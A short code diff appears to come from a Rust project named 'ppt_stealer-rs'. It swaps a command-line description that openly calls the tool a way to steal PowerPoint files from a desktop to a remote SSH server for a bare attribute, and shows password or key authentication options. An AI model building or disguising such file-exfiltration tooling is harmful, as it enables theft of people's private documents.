@@ -19,7 +19,7 @@ mod connection_tools;
 
 #[derive(Parser, Debug)]
 #[command(name = "ppt_stealer-rs", version = "0.2-beta.2")]
-#[command(about = "A tool to steal PowerPoint files from desktop to remote SSH server.", long_about = None)]
+#[command(about, long_about = None)]
 #[command(group(
     ArgGroup::new("auth")
         .args(&["password", "key_auth"])
